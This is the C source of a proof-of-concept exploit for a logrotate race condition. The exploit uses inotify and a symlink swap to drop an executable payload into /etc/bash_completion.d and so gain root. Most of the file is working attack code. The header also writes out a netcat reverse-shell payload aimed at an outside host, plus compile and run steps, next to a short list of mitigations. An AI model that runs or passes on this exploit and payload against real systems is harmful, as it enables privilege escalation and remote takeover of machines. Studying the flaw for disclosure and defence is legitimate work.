/*
 * logrotate poc exploit
 *
 * [ Brief description ]
 *   - logrotate is prone to a race condition after renaming the logfile.
 *   - If logrotate is executed as root and the user is in control of the logfile path, it is possible to abuse a race-condition to write files in ANY directories.
 *   - An attacker could elevate his privileges by writing reverse-shells into 
 *     directories like "/etc/bash_completition.d/".
 *
 * [ Precondition for privilege escalation ]
 *   - Logrotate needs to be executed as root
 *   - The logpath needs to be in control of the attacker
 *   - Any option(create,compress,copy,etc..) that creates a new file is set in the logrotate configuration. 
 * 
 * [ Tested version ]
 *   - Debian GNU/Linux 9.5 (stretch)
 *   - Amazon Linux 2 AMI (HVM)
 *   - Ubuntu 18.04.1
 *   - logrotate 3.8.6
 *   - logrotate 3.11.0
 *   - logrotate 3.15.0
 *
 * [ Compile ]
 *   - gcc -o logrotten logrotten.c
 *
 * [ Prepare payload ]
 *   - echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash myhost 3333 &); fi" > payloadfile
 *
 * [ Run exploit ]
 *   - nice -n -20 ./logrotten -p payloadfile /tmp/log/pwnme.log
 *   - if compress is used: nice -n -20 ./logrotten -c -s 3 -p payloadfile /tmp/log/pwnme.log.1
 *
 * [ Known Problems ]
 *   - It's hard to win the race inside a docker container or on a lvm2-volume
 *
 * [ Mitigation ]
 *   - make sure that logpath is owned by root
 *   - use su-option in logrotate.cfg
 *   - use selinux or apparmor
 *
 * [ Author ]
 *   - Wolfgang Hotwagner
 *
 * [ Contact ]
 *   - https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition
 *   - https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges
 *   - https://github.com/whotwagner/logrotten
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <string.h>
#include <alloca.h>
#include <sys/stat.h>
#include <getopt.h>

#include <asm/unistd.h>
#include <sys/syscall.h>

#define fastsymlink(a,b) syscall(__NR_symlink,(a),(b))
#define fastrename(a,b) syscall(__NR_rename,(a),(b))

#define EVENT_SIZE  ( sizeof (struct inotify_event) )
#define EVENT_BUF_LEN     ( 1024 * ( EVENT_SIZE + 16 ) )

/* use TARGETDIR without "/" at the end */
#define TARGETDIR "/etc/bash_completion.d"

#define PROGNAME "logrotten"

void usage(const char* progname)
{
	printf("usage: %s [OPTION...] <logfile>\n",progname);
	printf("  %-3s %-22s %-30s\n","-h","--help","Print this help");
	printf("  %-3s %-22s %-30s\n","-t","--targetdir <dir>","Abosulte path to the target directory");
	printf("  %-3s %-22s %-30s\n","-p","--payloadfile <file>","File that contains the payload");
	printf("  %-3s %-22s %-30s\n","-s","--sleep <sec>","Wait before writing the payload");
	printf("  %-3s %-22s %-30s\n","-d","--debug","Print verbose debug messages");
	printf("  %-3s %-22s %-30s\n","-c","--compress","Hijack compressed files instead of created logfiles");
	printf("  %-3s %-22s %-30s\n","-o","--open","Use IN_OPEN instead of IN_MOVED_FROM");
}

int main(int argc, char* argv[] )
{
  int length, i = 0;
  int j = 0;
  int z = 0;
  int index = 0;
  int fd;
  int wd;
  char buffer[EVENT_BUF_LEN];
  uint32_t imask = IN_MOVED_FROM;
  char *payloadfile = NULL;
  char *logfile = NULL;
  char *targetdir = NULL;
  char *logpath;
  char *logpath2;
  char *targetpath;
  int debug = 0;
  int sleeptime = 1;
  char ch;
  const char *p;
  FILE *source, *target;    

  int c;

  while(1)
  {
	int this_option_optind = optind ? optind : 1;
	int option_index = 0;
	static struct option long_options[] = {
		{"payloadfile", required_argument, 0, 0},
		{"targetdir", required_argument, 0, 0},
		{"sleep", required_argument, 0, 0},
		{"help", no_argument, 0, 0},
		{"open", no_argument, 0, 0},
		{"debug", no_argument, 0, 0},
		{"compress", no_argument, 0, 0},
		{0,0,0,0}
	};

	c = getopt_long(argc,argv,"hocdp:t:s:", long_options, &option_index);
	if (c == -1)
		break;

	switch(c)
	{
		case 'p':
			payloadfile = alloca((strlen(optarg)+1)*sizeof(char));
	  		memset(payloadfile,'\0',strlen(optarg)+1);
			strncpy(payloadfile,optarg,strlen(optarg));
			break;
		case 't':
			targetdir = alloca((strlen(optarg)+1)*sizeof(char));
	  		memset(targetdir,'\0',strlen(optarg)+1);
			strncpy(targetdir,optarg,strlen(optarg));
			break;
		case 'h':
			usage(PROGNAME);
			exit(EXIT_FAILURE);
			break;
		case 'd':
			debug = 1;
			break;
		case 'o':
			imask = IN_OPEN;
			break;
		case 'c':
			imask = IN_OPEN;
			break;
		case 's':
			sleeptime = atoi(optarg);
			break;
		default:
			usage(PROGNAME);
			exit(EXIT_FAILURE);
			break;
	}
  }

  if(argc == (optind+1))
  {
	  logfile = alloca((strlen(argv[optind])+1)*sizeof(char));
	  memset(logfile,'\0',strlen(argv[optind])+1);
	  strncpy(logfile,argv[optind],strlen(argv[optind]));
  }
  else
  {
	  usage(PROGNAME);
	  exit(EXIT_FAILURE);
  }

  for(j=strlen(logfile); (logfile[j] != '/') && (j != 0); j--);

  index = j+1;

  for(z=strlen(payloadfile); (payloadfile[z] != '/') && (z != 0); z--);
  if (strstr(payloadfile, "/"))
    z++;
  p = &payloadfile[z+1];

  logpath = alloca(strlen(logfile)*sizeof(char));
  logpath2 = alloca((strlen(logfile)+2)*sizeof(char));

  if(targetdir != NULL)
  {
  	targetpath = alloca( ( (strlen(targetdir)) + (strlen(p)) +3) *sizeof(char));
  	strcat(targetpath,targetdir);
  }
  else
  {
	targetdir= TARGETDIR;
  	targetpath = alloca( ( (strlen(TARGETDIR)) + (strlen(p)) +3) *sizeof(char));
        targetpath[0] = '\0';
  	strcat(targetpath,TARGETDIR);
  }
  strcat(targetpath,"/");
  strcat(targetpath,p);

  for(j = 0; j < index; j++)
	  logpath[j] = logfile[j];
  logpath[j-1] = '\0';

  strcpy(logpath2,logpath);
  logpath2[strlen(logpath)] = '2';
  logpath2[strlen(logpath)+1] = '\0';

  /*creating the INOTIFY instance*/
  fd = inotify_init();

  if( debug == 1)
  {
  	printf("logfile: %s\n",logfile);
  	printf("logpath: %s\n",logpath);
  	printf("logpath2: %s\n",logpath2);
  	printf("targetpath: %s\n",targetpath);
  	printf("targetdir: %s\n",targetdir);
  	printf("payloadfile: %s\n",p);
  }

  /*checking for error*/
  if ( fd < 0 ) {
    perror( "inotify_init" );
  }

  wd = inotify_add_watch( fd,logpath, imask );

  printf("Waiting for rotating %s...\n",logfile);

while(1)
{
  i=0;
  length = read( fd, buffer, EVENT_BUF_LEN ); 

  while (i < length) {     
      struct inotify_event *event = ( struct inotify_event * ) &buffer[ i ];     if ( event->len ) {
      if ( event->mask & imask ) { 
	  if(strcmp(event->name,p) == 0)
	  {
            fastrename(logpath,logpath2);
            fastsymlink(targetdir,logpath);
	    printf("Renamed %s with %s and created symlink to %s\n",logpath,logpath2,targetdir);
	    if(payloadfile != NULL)
	    {
		 printf("Waiting %d seconds before writing payload...\n",sleeptime);
	   	 sleep(sleeptime);
	   	 source = fopen(payloadfile, "r");	    
	   	 if(source == NULL)
	   	         exit(EXIT_FAILURE);

	   	 target = fopen(targetpath, "w");	    
	   	 if(target == NULL)
	   	 {
	   	         fclose(source);
	   	         exit(EXIT_FAILURE);
	   	 }

	   	 while ((ch = fgetc(source)) != EOF)
	   	         fputc(ch, target);

	   	 chmod(targetpath,S_IRUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
	   	 fclose(source);
	   	 fclose(target);
	    }
   	    inotify_rm_watch( fd, wd );
   	    close( fd );
	    printf("Done!\n");

	    exit(EXIT_SUCCESS);
	  }
      }
    }
    i += EVENT_SIZE + event->len;
  }
}
  /*removing from the watch list.*/
   inotify_rm_watch( fd, wd );

  /*closing the INOTIFY instance*/
   close( fd );

   exit(EXIT_SUCCESS);
}
